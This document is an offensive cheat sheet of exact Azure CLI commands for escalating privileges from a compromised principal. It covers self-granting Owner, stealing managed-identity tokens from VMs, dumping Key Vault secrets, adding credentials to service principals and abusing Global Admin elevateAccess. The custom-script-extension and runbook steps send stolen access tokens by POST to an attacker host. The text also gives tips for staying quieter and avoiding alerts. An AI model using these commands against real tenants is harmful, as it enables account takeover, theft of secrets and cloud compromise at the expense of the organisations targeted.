# Azure privilege-escalation methods — exact CLI

Placeholders: subscription `00000000-0000-0000-0000-000000000001`, tenant
`example.onmicrosoft.com`, attacker host `203.0.113.7`. Run as the compromised
principal (`az login` with user creds, `az login --service-principal`, or
`az login --identity` on compromised compute). Verify with `az account show`,
`az ad signed-in-user show`, and a privileged read that previously failed.
Activity Log records every ARM write; Entra audit logs record directory writes.

## 1. Microsoft.Authorization/roleAssignments/write — grant yourself Owner

Held by Owner, User Access Administrator, and many custom roles. Scope can be
management group, subscription, resource group, or single resource — escalation
works at whatever scope you hold it.

```
az ad signed-in-user show --query id -o tsv                    # your objectId
az role assignment create --assignee <objectId> --role Owner \
    --scope /subscriptions/00000000-0000-0000-0000-000000000001
# raw ARM (works with bare tokens):
az rest --method PUT \
  --url "https://management.azure.com/subscriptions/00000000-0000-0000-0000-000000000001/providers/Microsoft.Authorization/roleAssignments/$(uuidgen)?api-version=2022-04-01" \
  --body '{"properties":{"roleDefinitionId":"/subscriptions/00000000-0000-0000-0000-000000000001/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635","principalId":"<objectId>"}}'
```
(`8e3af657-...` = Owner role definition id, constant across tenants.)
Custom-role variant: `Microsoft.Authorization/roleDefinitions/write` lets you
*edit a custom role you already hold* to add `*` actions.

## 2. VM run-command — steal a VM's managed identity

Needs `Microsoft.Compute/virtualMachines/runCommand/action` (Virtual Machine
Contributor and above). Executes as SYSTEM/root.

```
az vm list --query "[].{n:name,rg:resourceGroup,id:identity}" -o table   # find VMs with identities
az vm run-command invoke -g prod-rg -n app-vm01 --command-id RunShellScript \
  --scripts 'curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
# Windows: --command-id RunPowerShellScript --scripts 'Invoke-RestMethod -Headers @{Metadata="true"} -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"'
```

Use the returned `access_token` directly:

```
az rest --method GET --headers "Authorization=Bearer <token>" \
  --url "https://management.azure.com/subscriptions?api-version=2022-12-01"
# or: az login --identity never leaves the VM; from outside use raw az rest with the token
```
Also request `resource=https://vault.azure.net` or
`https://graph.microsoft.com` tokens depending on what the identity can reach.

## 3. Custom Script Extension — same result, different permission

Needs `Microsoft.Compute/virtualMachines/extensions/write`.

```
az vm extension set -g prod-rg --vm-name app-vm01 \
  --name CustomScript --publisher Microsoft.Azure.Extensions \
  --settings '{"commandToExecute":"curl -s -H Metadata:true \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" | curl -sX POST -d @- http://203.0.113.7/c"}'
```
Windows publisher: `Microsoft.Compute`, name `CustomScriptExtension`.
Related: `osProfile` password reset via `VMAccessAgent`/`VMAccessForLinux`
extension (`az vm user update -u azureuser -p 'NewP@ss1!'`).

## 4. Key Vault — access-policy and data-plane abuse

Control plane `Microsoft.KeyVault/vaults/write` (Contributor) lets you grant
yourself a data-plane access policy on policy-model vaults:

```
az keyvault list -o table
az keyvault set-policy -n corp-vault --object-id <yourObjectId> \
    --secret-permissions get list --key-permissions get list decrypt sign \
    --certificate-permissions get list
az keyvault secret list --vault-name corp-vault -o table
az keyvault secret show --vault-name corp-vault -n prod-db-connstring --query value -o tsv
```

RBAC-model vaults: assign yourself `Key Vault Secrets User` /
`Key Vault Administrator` with method 1 scoped to the vault. Loot targets:
connection strings, SP client secrets, certificates (`az keyvault secret
download`), automation creds — each one is a new identity to loop back in.

## 5. Automation account runbooks — run as the account's identity

Automation Contributor (or `Microsoft.Automation/automationAccounts/*` writes)
on an account with a Run-As SP or managed identity (often Contributor+ on the
subscription):

```
az automation account list -o table
cat > /tmp/rb.ps1 <<'EOF'
Connect-AzAccount -Identity | Out-Null
$t = (Get-AzAccessToken -ResourceUrl https://management.azure.com/).Token
Invoke-RestMethod -Method Post -Uri http://203.0.113.7/c -Body $t
EOF
az automation runbook create -g auto-rg --automation-account-name corp-auto \
    -n Maint --type PowerShell
az automation runbook replace-content -g auto-rg --automation-account-name corp-auto \
    -n Maint --content @/tmp/rb.ps1
az automation runbook publish -g auto-rg --automation-account-name corp-auto -n Maint
az automation runbook start -g auto-rg --automation-account-name corp-auto -n Maint
```
Quieter: modify an *existing* scheduled runbook. Also loot
`az automation credential list` / variables (often plaintext creds) and hybrid
worker groups (code exec on on-prem workers).

## 6. App/SP owner → add client secret → authenticate as the SP

Being **Owner** of an application/SP (or holding Graph
`Application.ReadWrite.All`) lets you add credentials to it; the SP's RBAC and
Graph app-roles become yours:

```
az ad app list --query "[].{name:displayName,appId:appId}" -o table
az ad app owner list --id <appId>                        # confirm ownership path
az ad app credential reset --id <appId> --append --display-name sync
# -> returns appId / password / tenant
az login --service-principal -u <appId> -p '<password>' --tenant example.onmicrosoft.com
az role assignment list --assignee <appId> --all -o table   # what did we just become?
```
Graph-raw variant: `az rest --method POST --url
"https://graph.microsoft.com/v1.0/applications/<objId>/addPassword" --body '{}'`.
SPs holding `RoleManagement.ReadWrite.Directory` or `AppRoleAssignment.ReadWrite.All`
can self-grant Global Admin-equivalent Graph roles — check
`az ad app permission list --id <appId>`.

## 7. Global Administrator → elevateAccess → Azure RBAC root

Entra GA has no ARM rights by default; one documented toggle fixes that:

```
az rest --method POST \
  --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"
# -> you are now User Access Administrator at scope "/" (all mgmt groups/subscriptions)
az role assignment create --assignee <yourObjectId> --role Owner \
    --scope /providers/Microsoft.Management/managementGroups/<rootMgId>
```
Also reachable via portal (Entra ID → Properties → "Access management for
Azure resources"). Heavily alerted in mature tenants; do it once, grant
durable Owner, consider toggling back.

## 8. User-assigned managed identity assignment

`Microsoft.ManagedIdentity/userAssignedIdentities/assign/action` + write on any
compute lets you attach a powerful identity to compute you control:

```
az identity list -o table                                # find strong identities
az role assignment list --assignee <identityPrincipalId> --all -o table
az vm identity assign -g lab-rg -n our-vm \
    --identities /subscriptions/.../resourceGroups/id-rg/providers/Microsoft.ManagedIdentity/userAssignedIdentities/prod-deployer
# on the VM:
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<identityClientId>"
```
Same trick with Function Apps / App Service (`az webapp identity assign`),
Logic Apps, and AKS kubelet identities.

## Verification & looping

```
az account show ; az role assignment list --assignee <me> --all -o table
az rest --method GET --url https://graph.microsoft.com/v1.0/me
```
Every secret/token/SP recovered feeds `cloud-credential-enumeration`; re-run
enumeration (ROADrecon/AzureHound-style, or ScoutSuite) as the new principal.
